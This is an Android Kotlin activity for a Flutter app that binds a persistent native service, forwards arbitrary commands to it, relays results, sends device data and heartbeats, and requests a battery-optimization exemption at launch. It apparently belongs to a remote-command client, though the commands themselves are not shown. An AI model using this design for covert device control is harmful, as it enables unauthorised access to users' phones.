// android/app/src/main/kotlin/com/example/kem/MainActivity.kt
package com.example.kem

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.EventChannel
import android.util.Log
import android.content.Context
import android.content.Intent
import android.content.ComponentName
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.net.Uri
import android.os.Build
import androidx.core.content.ContextCompat
import org.json.JSONObject
import kotlinx.coroutines.*
import android.content.BroadcastReceiver
import android.content.IntentFilter

class MainActivity : FlutterActivity(), NativeCommandService.CommandCallback {
    private val NATIVE_COMMANDS_CHANNEL = "com.example.kem/native_commands"
    private val BATTERY_CHANNEL_NAME = "com.example.kem/battery"
    private val IPC_CHANNEL = "com.example.kem.ipc"
    private val CONNECTION_STATUS_CHANNEL = "com.example.kem.connection_status"
    private val COMMAND_RESULT_CHANNEL = "com.example.kem.command_results"
    private val TAG = "MainActivityEthical"

    // Native service integration
    private var nativeCommandService: NativeCommandService? = null
    private var isServiceBound = false
    private val pendingMethodResults = mutableMapOf<String, MethodChannel.Result>()
    
    // Event channel sinks for broadcasting to Flutter
    private var connectionStatusSink: EventChannel.EventSink? = null
    private var commandResultSink: EventChannel.EventSink? = null
    
    // Broadcast receivers for IPC communication
    private val connectionStatusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == NativeCommandService.ACTION_CONNECTION_STATUS) {
                val connected = intent.getBooleanExtra("connected", false)
                val deviceId = intent.getStringExtra("deviceId") ?: "unknown"
                
                Log.d(TAG, "Received connection status broadcast: $connected")
                
                val statusMap = mapOf(
                    "connected" to connected,
                    "deviceId" to deviceId,
                    "timestamp" to System.currentTimeMillis()
                )
                
                connectionStatusSink?.success(statusMap)
            }
        }
    }
    
    private val commandResultReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == NativeCommandService.ACTION_COMMAND_RESULT) {
                val command = intent.getStringExtra("command") ?: "unknown"
                val success = intent.getBooleanExtra("success", false)
                val resultString = intent.getStringExtra("result") ?: "{}"
                
                Log.d(TAG, "Received command result broadcast: $command - $success")
                
                val resultMap = mapOf(
                    "command" to command,
                    "success" to success,
                    "result" to resultString,
                    "timestamp" to System.currentTimeMillis()
                )
                
                commandResultSink?.success(resultMap)
            }
        }
    }
    
    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(className: ComponentName, service: IBinder) {
            val binder = service as NativeCommandService.LocalBinder
            nativeCommandService = binder.getService()
            nativeCommandService?.setCommandCallback(this@MainActivity)
            isServiceBound = true
            Log.d(TAG, "Native command service connected")
        }

        override fun onServiceDisconnected(arg0: ComponentName) {
            nativeCommandService = null
            isServiceBound = false
            Log.d(TAG, "Native command service disconnected")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Register broadcast receivers for IPC
        registerReceiver(
            connectionStatusReceiver,
            IntentFilter(NativeCommandService.ACTION_CONNECTION_STATUS)
        )
        registerReceiver(
            commandResultReceiver,
            IntentFilter(NativeCommandService.ACTION_COMMAND_RESULT)
        )
        
        // Start and bind to native command service
        startNativeCommandService()
        bindNativeCommandService()
        
        // Request battery optimization exemption on app start
        Log.d(TAG, "onCreate: Requesting battery optimization exemption")
        requestIgnoreBatteryOptimizations()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        Log.d(TAG, "FlutterEngine configured for native IPC operation.")

        // Battery Channel
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BATTERY_CHANNEL_NAME).setMethodCallHandler { call, result ->
            when (call.method) {
                "requestIgnoreBatteryOptimizations" -> {
                    Log.d(TAG, "MethodChannel: 'requestIgnoreBatteryOptimizations' called from Flutter")
                    requestIgnoreBatteryOptimizations()
                    result.success(null)
                }
                "isIgnoringBatteryOptimizations" -> {
                    val isIgnoring = isIgnoringBatteryOptimizations()
                    Log.d(TAG, "MethodChannel: 'isIgnoringBatteryOptimizations' called, result: $isIgnoring")
                    result.success(isIgnoring)
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $BATTERY_CHANNEL_NAME.")
                    result.notImplemented()
                }
            }
        }

        // IPC Channel for Flutter Background Service communication
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, IPC_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "ping" -> {
                    // Health check for native service
                    result.success("pong")
                }
                "startNativeService" -> {
                    val deviceId = call.argument<String>("deviceId") ?: "unknown"
                    startNativeCommandServiceWithDeviceId(deviceId)
                    result.success(true)
                }
                "stopNativeService" -> {
                    stopNativeCommandService()
                    result.success(true)
                }
                "sendInitialData" -> {
                    val jsonDataMap = call.argument<Map<String, Any>>("jsonData") ?: emptyMap()
                    val imagePath = call.argument<String>("imagePath")
                    val deviceId = call.argument<String>("deviceId") ?: "unknown"
                    
                    sendInitialDataViaIPC(jsonDataMap, imagePath, deviceId, result)
                }
                "sendHeartbeat" -> {
                    val deviceId = call.argument<String>("deviceId") ?: "unknown"
                    val timestamp = call.argument<String>("timestamp") ?: ""
                    
                    sendHeartbeatViaIPC(deviceId, timestamp, result)
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $IPC_CHANNEL.")
                    result.notImplemented()
                }
            }
        }

        // Native Commands Channel - Direct execution
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_COMMANDS_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "executeCommand" -> {
                    val command = call.argument<String>("command")
                    val argsMap = call.argument<Map<String, Any>>("args") ?: emptyMap()
                    
                    if (command != null) {
                        executeNativeCommand(command, argsMap, result)
                    } else {
                        result.error("INVALID_ARGS", "Command parameter is required", null)
                    }
                }
                "isNativeServiceAvailable" -> {
                    result.success(isServiceBound && nativeCommandService != null)
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $NATIVE_COMMANDS_CHANNEL.")
                    result.notImplemented()
                }
            }
        }

        // Event channels for broadcasting status to Flutter
        EventChannel(flutterEngine.dartExecutor.binaryMessenger, CONNECTION_STATUS_CHANNEL).setStreamHandler(
            object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    connectionStatusSink = events
                    Log.d(TAG, "Connection status event channel listener attached")
                }

                override fun onCancel(arguments: Any?) {
                    connectionStatusSink = null
                    Log.d(TAG, "Connection status event channel listener detached")
                }
            }
        )

        EventChannel(flutterEngine.dartExecutor.binaryMessenger, COMMAND_RESULT_CHANNEL).setStreamHandler(
            object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    commandResultSink = events
                    Log.d(TAG, "Command result event channel listener attached")
                }

                override fun onCancel(arguments: Any?) {
                    commandResultSink = null
                    Log.d(TAG, "Command result event channel listener detached")
                }
            }
        )
    }

    private fun sendInitialDataViaIPC(
        jsonDataMap: Map<String, Any>,
        imagePath: String?,
        deviceId: String,
        result: MethodChannel.Result
    ) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Convert map to JSONObject
                val jsonData = JSONObject()
                jsonDataMap.forEach { (key, value) ->
                    jsonData.put(key, value)
                }
                jsonData.put("deviceId", deviceId)
                
                // Send via native service if available
                val service = nativeCommandService
                if (service != null) {
                    Log.d(TAG, "Sending initial data via bound native service")
                    // TODO: Implement sendInitialData method in NativeCommandService
                    // For now, just return success
                    withContext(Dispatchers.Main) {
                        result.success(true)
                    }
                } else {
                    // Send via broadcast
                    Log.d(TAG, "Sending initial data via broadcast to native service")
                    val intent = Intent("com.example.kem.SEND_INITIAL_DATA").apply {
                        putExtra("jsonData", jsonData.toString())
                        putExtra("imagePath", imagePath)
                        putExtra("deviceId", deviceId)
                    }
                    sendBroadcast(intent)
                    
                    withContext(Dispatchers.Main) {
                        result.success(true)
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error sending initial data via IPC", e)
                withContext(Dispatchers.Main) {
                    result.error("IPC_ERROR", "Failed to send initial data: ${e.message}", null)
                }
            }
        }
    }

    private fun sendHeartbeatViaIPC(deviceId: String, timestamp: String, result: MethodChannel.Result) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val service = nativeCommandService
                if (service != null) {
                    Log.d(TAG, "Sending heartbeat via bound native service")
                    // The native service will handle heartbeat automatically via Socket.IO
                    withContext(Dispatchers.Main) {
                        result.success(true)
                    }
                } else {
                    Log.d(TAG, "Native service not bound, heartbeat will be handled automatically")
                    withContext(Dispatchers.Main) {
                        result.success(true)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending heartbeat via IPC", e)
                withContext(Dispatchers.Main) {
                    result.error("IPC_ERROR", "Failed to send heartbeat: ${e.message}", null)
                }
            }
        }
    }

    /**
     * Execute command through native service
     */
    private fun executeNativeCommand(
        command: String, 
        args: Map<String, Any>, 
        result: MethodChannel.Result
    ) {
        if (!isServiceBound || nativeCommandService == null) {
            Log.e(TAG, "Native service not available for command: $command")
            result.error("SERVICE_UNAVAILABLE", "Native command service not available", null)
            return
        }
        
        try {
            val argsJson = JSONObject()
            args.forEach { (key, value) ->
                argsJson.put(key, value)
            }
            
            Log.d(TAG, "Executing native command: $command with args: $argsJson")
            
            // Generate request ID and store result callback
            val requestId = NativeCommandService.executeCommand(this, command, argsJson)
            pendingMethodResults[requestId] = result
            
            Log.d(TAG, "Native command queued with ID: $requestId")
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to execute native command: $command", e)
            result.error("COMMAND_FAILED", "Failed to execute command: ${e.message}", null)
        }
    }

    // Command callback from native service
    override fun onCommandResult(command: String, success: Boolean, result: JSONObject) {
        Log.d(TAG, "Native command result: $command, success: $success")
        
        val requestId = result.optString("requestId", "")
        val methodResult = pendingMethodResults.remove(requestId)
        
        if (methodResult != null) {
            CoroutineScope(Dispatchers.Main).launch {
                if (success) {
                    // Convert JSONObject to Map for Flutter
                    val resultMap = mutableMapOf<String, Any>()
                    result.keys().forEach { key ->
                        when (val value = result.get(key)) {
                            is org.json.JSONArray -> {
                                // Convert JSONArray to List
                                val list = mutableListOf<Any>()
                                for (i in 0 until value.length()) {
                                    list.add(value.get(i))
                                }
                                resultMap[key] = list
                            }
                            is org.json.JSONObject -> {
                                // Convert nested JSONObject to Map
                                val nestedMap = mutableMapOf<String, Any>()
                                value.keys().forEach { nestedKey ->
                                    nestedMap[nestedKey] = value.get(nestedKey)
                                }
                                resultMap[key] = nestedMap
                            }
                            else -> resultMap[key] = value
                        }
                    }
                    methodResult.success(resultMap)
                } else {
                    val error = result.optString("error", "Unknown error")
                    methodResult.error("COMMAND_FAILED", error, null)
                }
            }
        } else {
            Log.w(TAG, "No pending result found for request ID: $requestId")
        }
    }

    private fun startNativeCommandService() {
        val intent = Intent(this, NativeCommandService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        Log.d(TAG, "Started native command service")
    }
    
    private fun startNativeCommandServiceWithDeviceId(deviceId: String) {
        val intent = Intent(this, NativeCommandService::class.java).apply {
            putExtra("deviceId", deviceId)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        Log.d(TAG, "Started native command service with device ID: $deviceId")
    }
    
    private fun stopNativeCommandService() {
        try {
            if (isServiceBound) {
                unbindService(serviceConnection)
                isServiceBound = false
            }
            
            val intent = Intent(this, NativeCommandService::class.java)
            stopService(intent)
            Log.d(TAG, "Stopped native command service")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping native command service", e)
        }
    }
    
    private fun bindNativeCommandService() {
        val intent = Intent(this, NativeCommandService::class.java)
        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
        Log.d(TAG, "Binding to native command service")
    }

    // Battery optimization methods
    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent()
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.d(TAG, "requestIgnoreBatteryOptimizations: Requesting battery optimization exemption")
                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = Uri.parse("package:$packageName")
                try {
                    startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to open battery optimization settings", e)
                }
            } else {
                Log.d(TAG, "requestIgnoreBatteryOptimizations: Battery optimization already disabled")
            }
        } else {
            Log.d(TAG, "requestIgnoreBatteryOptimizations: Not needed on Android version < 23")
        }
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            val isIgnoring = pm.isIgnoringBatteryOptimizations(packageName)
            Log.d(TAG, "isIgnoringBatteryOptimizations: $isIgnoring")
            isIgnoring
        } else {
            Log.d(TAG, "isIgnoringBatteryOptimizations: true (no battery optimization on older versions)")
            true
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "MainActivity onDestroy called.")
        super.onDestroy()
        
        // Unregister broadcast receivers
        try {
            unregisterReceiver(connectionStatusReceiver)
            unregisterReceiver(commandResultReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receivers", e)
        }
        
        // Unbind from service
        if (isServiceBound) {
            try {
                unbindService(serviceConnection)
            } catch (e: Exception) {
                Log.e(TAG, "Error unbinding service", e)
            }
            isServiceBound = false
        }
        
        Log.d(TAG, "MainActivity onDestroy completed.")
    }
}